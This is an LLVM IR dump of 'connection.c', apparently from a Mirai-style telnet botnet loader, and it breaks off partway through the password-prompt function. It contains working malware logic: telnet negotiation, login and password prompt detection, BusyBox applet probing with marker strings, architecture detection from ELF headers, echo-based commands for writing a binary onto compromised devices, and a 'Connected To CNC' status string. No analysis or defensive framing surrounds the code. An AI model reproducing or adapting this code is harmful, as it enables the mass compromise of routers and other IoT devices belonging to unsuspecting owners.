; ModuleID = 'connection.c'
source_filename = "connection.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i32, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.elf_hdr = type { [16 x i8], i16, i16, i32 }

@__const.connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@__const.connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"AK1K2: applet not found\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.13 = private unnamed_addr constant [4 x i8] c"rce\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"arc\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.16 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.18 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.19 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.20 = private unnamed_addr constant [40 x i8] c"echo '%s\\c' %s %s; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.24 = private unnamed_addr constant [42 x i8] c"echo -ne '%s' %s %s; /bin/busybox AK1K2\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"nvalid option\00", align 1
@.str.27 = private unnamed_addr constant [14 x i8] c"llegal option\00", align 1
@.str.28 = private unnamed_addr constant [24 x i8] c"No space left on device\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.30 = private unnamed_addr constant [25 x i8] c"O2J134: applet not found\00", align 1
@.str.31 = private unnamed_addr constant [17 x i8] c"Connected To CNC\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @connection_open(%struct.connection* %0) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 12
  store i16 0, i16* %7, align 8
  %8 = call i64 @time(i64* null) #5
  %9 = load %struct.connection*, %struct.connection** %2, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %9, i32 0, i32 9
  store i64 %8, i64* %10, align 8
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 13
  store i16 15, i16* %12, align 2
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 5
  store i32 0, i32* %14, align 4
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 10
  store i32 1, i32* %16, align 8
  %17 = load %struct.connection*, %struct.connection** %2, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  store i8 0, i8* %18, align 1
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 14
  store i8 1, i8* %20, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 2
  store %struct.binary* null, %struct.binary** %22, align 8
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 6
  store i32 0, i32* %24, align 8
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 7
  store i32 0, i32* %26, align 4
  %27 = load %struct.connection*, %struct.connection** %2, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 3
  %29 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %28, i32 0, i32 8
  store i8 0, i8* %29, align 1
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %30, i32 0, i32 8
  store i32 0, i32* %31, align 8
  %32 = load %struct.connection*, %struct.connection** %2, align 8
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %32, i32 0, i32 0
  %34 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %33) #5
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @connection_close(%struct.connection* %0) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 14
  %8 = load i8, i8* %7, align 4
  %9 = icmp ne i8 %8, 0
  br i1 %9, label %10, label %60

10:                                               ; preds = %1
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 11
  %13 = getelementptr inbounds %struct.anon, %struct.anon* %12, i32 0, i32 0
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 512, i1 false)
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 11
  %17 = getelementptr inbounds %struct.anon, %struct.anon* %16, i32 0, i32 1
  store i32 0, i32* %17, align 4
  %18 = load %struct.connection*, %struct.connection** %2, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 9
  store i64 0, i64* %19, align 8
  %20 = load %struct.connection*, %struct.connection** %2, align 8
  %21 = getelementptr inbounds %struct.connection, %struct.connection* %20, i32 0, i32 14
  store i8 0, i8* %21, align 4
  %22 = load %struct.connection*, %struct.connection** %2, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 16
  store i8 0, i8* %23, align 2
  %24 = load %struct.connection*, %struct.connection** %2, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 17
  store i8 0, i8* %25, align 1
  %26 = load %struct.connection*, %struct.connection** %2, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 18
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 8 %28, i8 0, i64 8192, i1 false)
  %29 = load %struct.connection*, %struct.connection** %2, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 12
  store i16 0, i16* %30, align 8
  %31 = load %struct.connection*, %struct.connection** %2, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 5
  store i32 0, i32* %32, align 4
  %33 = load %struct.connection*, %struct.connection** %2, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 6
  store i32 0, i32* %34, align 8
  %35 = load %struct.connection*, %struct.connection** %2, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 7
  store i32 0, i32* %36, align 4
  %37 = load %struct.connection*, %struct.connection** %2, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 3
  %39 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %38, i32 0, i32 8
  store i8 0, i8* %39, align 1
  %40 = load %struct.connection*, %struct.connection** %2, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 8
  store i32 0, i32* %41, align 8
  %42 = load %struct.connection*, %struct.connection** %2, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 1
  %44 = load %struct.server*, %struct.server** %43, align 8
  %45 = icmp eq %struct.server* %44, null
  br i1 %45, label %46, label %47

46:                                               ; preds = %10
  br label %83

47:                                               ; preds = %10
  %48 = load %struct.connection*, %struct.connection** %2, align 8
  %49 = getelementptr inbounds %struct.connection, %struct.connection* %48, i32 0, i32 15
  %50 = load i8, i8* %49, align 1
  %51 = icmp ne i8 %50, 0
  br i1 %51, label %52, label %58

52:                                               ; preds = %47
  %53 = load %struct.connection*, %struct.connection** %2, align 8
  %54 = getelementptr inbounds %struct.connection, %struct.connection* %53, i32 0, i32 1
  %55 = load %struct.server*, %struct.server** %54, align 8
  %56 = getelementptr inbounds %struct.server, %struct.server* %55, i32 0, i32 7
  %57 = atomicrmw add i32* %56, i32 1 seq_cst, align 4
  br label %59

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %52
  br label %60

60:                                               ; preds = %59, %1
  %61 = load %struct.connection*, %struct.connection** %2, align 8
  %62 = getelementptr inbounds %struct.connection, %struct.connection* %61, i32 0, i32 10
  store i32 0, i32* %62, align 8
  %63 = load %struct.connection*, %struct.connection** %2, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 4
  %65 = load i32, i32* %64, align 8
  %66 = icmp ne i32 %65, -1
  br i1 %66, label %67, label %79

67:                                               ; preds = %60
  %68 = load %struct.connection*, %struct.connection** %2, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 4
  %70 = load i32, i32* %69, align 8
  %71 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %70)
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 4
  store i32 -1, i32* %73, align 8
  %74 = load %struct.connection*, %struct.connection** %2, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 1
  %76 = load %struct.server*, %struct.server** %75, align 8
  %77 = getelementptr inbounds %struct.server, %struct.server* %76, i32 0, i32 1
  %78 = atomicrmw sub i32* %77, i32 1 seq_cst, align 4
  br label %79

79:                                               ; preds = %67, %60
  %80 = load %struct.connection*, %struct.connection** %2, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 0
  %82 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %81) #5
  br label %83

83:                                               ; preds = %79, %46
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare i32 @close(...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_iacs(%struct.connection* %0) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 18
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  store i8* %10, i8** %4, align 8
  br label %11

11:                                               ; preds = %137, %41, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 12
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = icmp slt i32 %12, %16
  br i1 %17, label %18, label %138

18:                                               ; preds = %11
  store i32 0, i32* %5, align 4
  %19 = load i8*, i8** %4, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp ne i32 %21, 255
  br i1 %22, label %23, label %24

23:                                               ; preds = %18
  br label %138

24:                                               ; preds = %18
  %25 = load i8*, i8** %4, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 255
  br i1 %28, label %29, label %136

29:                                               ; preds = %24
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = load i8*, i8** %4, align 8
  %32 = call signext i8 @can_consume(%struct.connection* %30, i8* %31, i32 1)
  %33 = icmp ne i8 %32, 0
  br i1 %33, label %35, label %34

34:                                               ; preds = %29
  br label %138

35:                                               ; preds = %29
  %36 = load i8*, i8** %4, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 255
  br i1 %40, label %41, label %46

41:                                               ; preds = %35
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 2
  store i8* %43, i8** %4, align 8
  %44 = load i32, i32* %3, align 4
  %45 = add nsw i32 %44, 2
  store i32 %45, i32* %3, align 4
  br label %11, !llvm.loop !6

46:                                               ; preds = %35
  %47 = load i8*, i8** %4, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 253
  br i1 %51, label %52, label %82

52:                                               ; preds = %46
  %53 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %53, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.connection_consume_iacs.tmp1, i32 0, i32 0), i64 3, i1 false)
  %54 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %54, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.connection_consume_iacs.tmp2, i32 0, i32 0), i64 9, i1 false)
  %55 = load %struct.connection*, %struct.connection** %2, align 8
  %56 = load i8*, i8** %4, align 8
  %57 = call signext i8 @can_consume(%struct.connection* %55, i8* %56, i32 2)
  %58 = icmp ne i8 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52
  br label %138

60:                                               ; preds = %52
  %61 = load i8*, i8** %4, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 2
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 31
  br i1 %65, label %66, label %67

66:                                               ; preds = %60
  br label %83

67:                                               ; preds = %60
  %68 = load i8*, i8** %4, align 8
  %69 = getelementptr inbounds i8, i8* %68, i64 3
  store i8* %69, i8** %4, align 8
  %70 = load i32, i32* %3, align 4
  %71 = add nsw i32 %70, 3
  store i32 %71, i32* %3, align 4
  %72 = load %struct.connection*, %struct.connection** %2, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 4
  %74 = load i32, i32* %73, align 8
  %75 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i64 0, i64 0
  %76 = call i64 @send(i32 %74, i8* %75, i64 3, i32 16384)
  %77 = load %struct.connection*, %struct.connection** %2, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 4
  %79 = load i32, i32* %78, align 8
  %80 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %81 = call i64 @send(i32 %79, i8* %80, i64 9, i32 16384)
  br label %134

82:                                               ; preds = %46
  br label %83

83:                                               ; preds = %82, %66
  %84 = load %struct.connection*, %struct.connection** %2, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call signext i8 @can_consume(%struct.connection* %84, i8* %85, i32 2)
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %89, label %88

88:                                               ; preds = %83
  br label %138

89:                                               ; preds = %83
  store i32 0, i32* %5, align 4
  br label %90

90:                                               ; preds = %121, %89
  %91 = load i32, i32* %5, align 4
  %92 = icmp slt i32 %91, 3
  br i1 %92, label %93, label %124

93:                                               ; preds = %90
  %94 = load i8*, i8** %4, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 253
  br i1 %100, label %101, label %106

101:                                              ; preds = %93
  %102 = load i8*, i8** %4, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  store i8 -4, i8* %105, align 1
  br label %120

106:                                              ; preds = %93
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 251
  br i1 %113, label %114, label %119

114:                                              ; preds = %106
  %115 = load i8*, i8** %4, align 8
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  store i8 -3, i8* %118, align 1
  br label %119

119:                                              ; preds = %114, %106
  br label %120

120:                                              ; preds = %119, %101
  br label %121

121:                                              ; preds = %120
  %122 = load i32, i32* %5, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %5, align 4
  br label %90, !llvm.loop !8

124:                                              ; preds = %90
  %125 = load %struct.connection*, %struct.connection** %2, align 8
  %126 = getelementptr inbounds %struct.connection, %struct.connection* %125, i32 0, i32 4
  %127 = load i32, i32* %126, align 8
  %128 = load i8*, i8** %4, align 8
  %129 = call i64 @send(i32 %127, i8* %128, i64 3, i32 16384)
  %130 = load i8*, i8** %4, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 3
  store i8* %131, i8** %4, align 8
  %132 = load i32, i32* %3, align 4
  %133 = add nsw i32 %132, 3
  store i32 %133, i32* %3, align 4
  br label %134

134:                                              ; preds = %124, %67
  br label %135

135:                                              ; preds = %134
  br label %136

136:                                              ; preds = %135, %24
  br label %137

137:                                              ; preds = %136
  br label %11, !llvm.loop !6

138:                                              ; preds = %88, %59, %34, %23, %11
  %139 = load i32, i32* %3, align 4
  ret i32 %139
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @can_consume(%struct.connection* %0, i8* %1, i32 %2) #0 {
  %4 = alloca %struct.connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %4, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 18
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %11 = load %struct.connection*, %struct.connection** %4, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 12
  %13 = load i16, i16* %12, align 8
  %14 = zext i16 %13 to i32
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %10, i64 %15
  store i8* %16, i8** %7, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %7, align 8
  %22 = icmp ult i8* %20, %21
  %23 = zext i1 %22 to i32
  %24 = trunc i32 %23 to i8
  ret i8 %24
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_login_prompt(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

12:                                               ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %66

15:                                               ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 18
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

24:                                               ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 18
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

33:                                               ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 18
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

42:                                               ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 18
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

51:                                               ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 18
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

60:                                               ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %66

62:                                               ; preds = %51
  br label %63

63:                                               ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %12, !llvm.loop !9

66:                                               ; preds = %60, %12
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %95

69:                                               ; preds = %66
  store i32 0, i32* %7, align 4
  %70 = load %struct.connection*, %struct.connection** %3, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 18
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %71, i64 0, i64 0
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 12
  %75 = load i16, i16* %74, align 8
  %76 = zext i16 %75 to i32
  %77 = call i32 @util_memsearch(i8* %72, i32 %76, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  store i32 %77, i32* %7, align 4
  %78 = icmp ne i32 %77, -1
  br i1 %78, label %79, label %81

79:                                               ; preds = %69
  %80 = load i32, i32* %7, align 4
  store i32 %80, i32* %6, align 4
  br label %94

81:                                               ; preds = %69
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 18
  %84 = getelementptr inbounds [8192 x i8], [8192 x i8]* %83, i64 0, i64 0
  %85 = load %struct.connection*, %struct.connection** %3, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 12
  %87 = load i16, i16* %86, align 8
  %88 = zext i16 %87 to i32
  %89 = call i32 @util_memsearch(i8* %84, i32 %88, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i32 5)
  store i32 %89, i32* %7, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %93

91:                                               ; preds = %81
  %92 = load i32, i32* %7, align 4
  store i32 %92, i32* %6, align 4
  br label %93

93:                                               ; preds = %91, %81
  br label %94

94:                                               ; preds = %93, %79
  br label %95

95:                                               ; preds = %94, %66
  %96 = load i32, i32* %6, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

98:                                               ; preds = %95
  store i32 0, i32* %2, align 4
  br label %101

99:                                               ; preds = %95
  %100 = load i32, i32* %6, align 4
  store i32 %100, i32* %2, align 4
  br label %101

101:                                              ; preds = %99, %98
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_password_prompt(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

12:                                               ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %66

15:                                               ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 18
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

24:                                               ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 18
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
